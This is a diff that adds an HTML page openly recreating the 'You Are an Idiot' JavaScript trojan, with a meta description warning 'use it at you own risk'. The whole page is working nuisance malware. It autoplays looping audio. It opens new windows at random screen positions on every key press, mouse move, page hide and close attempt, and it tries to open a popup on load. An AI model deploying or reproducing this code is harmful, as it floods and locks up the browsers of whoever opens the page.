@@ -1,0 +1,41 @@
+<!doctype html>
+<html>
+<head>
+<title>You are an Idiot</title>
+<meta name="keywords" content="you are an idiot, youareanidiot.org, Trojan.JS.YouAreAnIdiot, Javascript, recreation, idiot, idiot test, fool, you, are, an, idiot, dot, org"> 
+<meta name="description" content="Recreation of Trojan.JS.YouAreAnIdiot: Use it at you own risk!">
+<link rel="stylesheet" type="text/css" href="block/style.css"/>
+<link rel="icon" href="263A.png">
+</head>
+<body>
+<div>
+<audio loop src="block/idiot.mp3" autoplay>
+</div>
+<script type="text/javascript">
+document.onkeydown = function() {
+var w = window.open("index.html", '_blank', 'location=yes,scrollbars=yes,resizeable=0,status=yes').moveTo(Math.floor(Math.random() * window.screen.availWidth) + 1,Math.floor(Math.random() * window.screen.availHeight) + 1  );
+w.focus()
+}
+document.onpagehide = function() {
+var w = window.open("index.html", '_blank', 'location=yes,scrollbars=yes,resizeable=0,status=yes').moveTo(Math.floor(Math.random() * window.screen.availWidth) + 1,Math.floor(Math.random() * window.screen.availHeight) + 1  );
+w.focus()
+}
+document.onmousemove = function() {
+var w = window.open("index.html", '_blank', 'location=yes,scrollbars=yes,resizeable=0,status=yes').moveTo(Math.floor(Math.random() * window.screen.availWidth) + 1,Math.floor(Math.random() * window.screen.availHeight) + 1  );
+w.focus()
+}
+window.onbeforeunload = function(){
+  window.open("index.html", '_blank', 'location=yes,width=650,height=500,scrollbars=yes,status=yes');
+};
+
+try {
+w = window.open("index.html", '_blank', 'location=yes,width=25,height=25,scrollbars=no,status=yes');
+w.focus()
+}
+catch(err) {
+document.location = "block/idiotblock.html";
+}
+
+</script>
+</body>
+</html>
